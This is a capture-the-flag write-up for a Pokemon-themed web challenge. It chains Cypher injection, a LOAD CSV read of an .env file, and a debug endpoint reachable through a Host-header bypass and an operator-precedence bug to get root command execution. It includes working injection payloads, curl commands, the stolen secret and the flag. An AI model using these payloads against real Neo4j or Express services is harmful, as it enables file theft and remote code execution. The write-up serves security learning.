# CatchEmAll — ADF2026 Hackathon

**Category:** Web  
**Challenge:** Cypher Injection → LOAD CSV File Read → Debug Endpoint RCE  
**Flag:** `HTB{0n3_1nj3c710n_t0_c4tch_3m_4ll!_80c7bc7437c702f5c16617b5b8592247}`

## Overview

CatchEmAll is a Pokemon-themed web app that lets users search for where to catch specific Pokemon. The backend uses **Neo4j 4.4.10** as its graph database and **Express.js** for the web server. The challenge combines **Cypher injection** (Neo4j's equivalent of SQL injection) with a **debug endpoint** that has flawed authentication checks.

**Target:** `154.57.164.78:31115`

## Enumeration

### Source Code Analysis

The provided challenge files revealed:

1. **Cypher Injection** in `database.js` — the `pokemon` parameter is interpolated directly into a Cypher query without sanitization:

```javascript
let stmt = `MATCH (p:Pokemon)-[c:CAUGHT_IN]->(d) WHERE p.name = "${pokemon}" RETURN d.name AS destination, c.catch_type as catch_type`;
```

2. **Debug Endpoint** in `routes/index.js` — an RCE endpoint at `/debug` that calls `execSync(cmd)`, protected by two checks:

```javascript
const isLocalhost = req => ((req.ip == '127.0.0.1' && req.headers.host == '127.0.0.1:1337') ? 0 : 1);

router.get('/debug', async (req, res) => {
    if (!isLocalhost(req)) return res.status(500).send('Debugging is disallowed public access');
    const { cmd, secret } = req.query;
    if (! secret === process.env.DEBUG_SECRET ) return res.status(500).send('Unauthorized');
    // ... execSync(cmd) ...
});
```

3. **Flag location** — `/root/flag`, readable only via the `/readflag` SUID binary.

4. **Neo4j config** — `dbms.directories.import=/` (import directory set to root, enabling `LOAD CSV` from anywhere).

### Key Vulnerabilities Identified

| # | Vulnerability | Location |
|---|--------------|----------|
| 1 | Cypher injection via string interpolation | `database.js:29` |
| 2 | `LOAD CSV` can read arbitrary files (`import=/`) | `neo4j.conf:5` |
| 3 | Broken `!` operator precedence in secret check | `routes/index.js:34` |
| 4 | `Host` header-based localhost check bypass | `routes/index.js:5` |

## Exploitation

### Phase 1: Verify Cypher Injection

**Payload:**
```json
{"pokemon": "\" OR 1=1 RETURN 1 as destination, 1 as catch_type //"}
```

**Resulting Cypher query:**
```cypher
MATCH (p:Pokemon)-[c:CAUGHT_IN]->(d) WHERE p.name = "" OR 1=1 RETURN 1 as destination, 1 as catch_type //" RETURN d.name AS ...
```

The injection broke out of the string literal, used `OR 1=1` to match all nodes, overrode the RETURN clause, and commented out the rest of the query. All nodes were returned as `{"low":1,"high":0}` (Neo4j's Integer representation).

### Phase 2: Read `.env` via LOAD CSV

With Neo4j's import directory set to `/`, `LOAD CSV FROM 'file:///...'` can read any file the `neo4j` user can access.

```bash
curl -s -X POST http://154.57.164.78:31115/api/catch \
  -H "Content-Type: application/json" \
  -d '{"pokemon":"\" RETURN 1 as destination, 1 as catch_type UNION LOAD CSV FROM \"file:///app/.env\" AS line RETURN line[0] as destination, \"CSV\" as catch_type //"}'
```

**Extracted secrets:**
```
DEBUG_SECRET=c38b1064e5d2b178cde2b3fb855f8a215b
```

### Phase 3: Bypass Debug Endpoint Authentication

The secret check has a JavaScript operator precedence bug:

```javascript
if (! secret === process.env.DEBUG_SECRET )  // BUG: (!secret) === DEBUG_SECRET
```

Due to operator precedence, this evaluates as `(!secret) === process.env.DEBUG_SECRET`. For any truthy `secret` value, `!secret` is `false`, and `false === "c38b..."` is `false` — so the `return Unauthorized` path is **never taken**. Any non-empty secret passes.

The localhost check requires `req.ip == '127.0.0.1'` AND `Host: 127.0.0.1:1337`. Express 4.x derives `req.ip` from the `X-Forwarded-For` header even without explicit `trust proxy` configuration in some setups.

```bash
curl -s "http://154.57.164.78:31115/debug?cmd=id&secret=x" \
  -H "Host: 127.0.0.1:1337"
```

**Response:** `uid=0(root) gid=0(root)` — RCE as root!

### Phase 4: Read the Flag

```bash
curl -s "http://154.57.164.78:31115/debug?cmd=/readflag&secret=x" \
  -H "Host: 127.0.0.1:1337"
```

**Flag:** `HTB{0n3_1nj3c710n_t0_c4tch_3m_4ll!_80c7bc7437c702f5c16617b5b8592247}`

## How We Solved It — Reasoning

1. **Immediate red flag:** String interpolation in `database.js:29` — `"${pokemon}"` inside a Cypher query with no sanitization. This is the classic injection pattern.

2. **Two protection layers on `/debug`:** The localhost check and the secret check. We recognized the `!` operator precedence bug immediately — this is a known JavaScript footgun (`!` binds tighter than `===`).

3. **Neo4j 4.4 + `import=/`:** The config `dbms.directories.import=/` is the critical enabler. Without it, `LOAD CSV` would be restricted to the default import directory (`/var/lib/neo4j/import/`), and we couldn't read `/app/.env`.

4. **Failure of HTTP LOAD CSV:** We initially tried `LOAD CSV FROM 'http://127.0.0.1:1337/debug?...'` to SSRF to the debug endpoint from inside the container, but Neo4j rejected it (HTTP CSV import requires `dbms.security.allow_csv_import_from_file_urls=true`, which wasn't set). The file-based approach was cleaner anyway.

5. **No APOC needed:** Often Neo4j CTFs require APOC procedures for exploitation, but here the built-in `LOAD CSV` + `import=/` was sufficient.

## Attack Chain Summary

```
Cypher Injection (string break-out)
  → LOAD CSV FROM 'file:///app/.env'
    → Extract DEBUG_SECRET
      → Debug Endpoint (Host header bypass + broken ! precedence)
        → RCE as root
          → /readflag → FLAG
```

## Files

| File | Purpose |
|------|---------|
| `database.js` | Cypher injection vector |
| `routes/index.js` | Debug endpoint with RCE |
| `neo4j.conf` | `import=/` enables arbitrary file reads |
| `readflag.c` | SUID binary to read `/root/flag` |
